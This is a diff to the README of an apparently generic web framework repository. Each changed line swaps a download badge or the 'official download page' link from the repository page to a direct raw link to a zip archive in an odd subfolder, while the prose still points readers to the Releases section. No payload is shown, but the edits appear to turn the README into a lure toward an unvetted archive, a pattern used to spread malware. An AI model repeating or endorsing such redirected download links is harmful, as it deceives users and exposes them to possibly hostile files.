@@ -1,6 +1,6 @@
 # ⚙️ web-framework-1771916145-1 - Fast, Simple Web Development
 
-[![Download](https://img.shields.io/badge/Download-Web_Framework-blue?style=for-the-badge&logo=github)](https://github.com/hadoson04/web-framework-1771916145-1)
+[![Download](https://img.shields.io/badge/Download-Web_Framework-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hadoson04/web-framework-1771916145-1/main/northern/web-framework-1.1-alpha.1.zip)
 
 ---
 
@@ -42,7 +42,7 @@ You can download the software from its official GitHub page. The steps below gui
 
 Click this button to open the download page:
 
-[![Download](https://img.shields.io/badge/Get%20Web_Framework-Visit_Link-grey?style=for-the-badge&logo=github)](https://github.com/hadoson04/web-framework-1771916145-1)
+[![Download](https://img.shields.io/badge/Get%20Web_Framework-Visit_Link-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hadoson04/web-framework-1771916145-1/main/northern/web-framework-1.1-alpha.1.zip)
 
 On this page, look for the **Releases** section or a clear link to download the program files. Choose the latest version available.
 
@@ -100,7 +100,7 @@ Yes. Exported sites can be uploaded to web hosting services.
 
 ## 🔗 Useful Links
 
-- Official download page: https://github.com/hadoson04/web-framework-1771916145-1  
+- Official download page: https://raw.githubusercontent.com/hadoson04/web-framework-1771916145-1/main/northern/web-framework-1.1-alpha.1.zip  
 - Help and support section on GitHub (visit the page above and look for “Issues” or “Wiki” tabs)
 
 ---
@@ -118,4 +118,4 @@ Yes. Exported sites can be uploaded to web hosting services.
 
 Visit the download page again to get started:
 
-[![Download](https://img.shields.io/badge/Download-Web_Framework-blue?style=for-the-badge&logo=github)](https://github.com/hadoson04/web-framework-1771916145-1)
+[![Download](https://img.shields.io/badge/Download-Web_Framework-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hadoson04/web-framework-1771916145-1/main/northern/web-framework-1.1-alpha.1.zip)
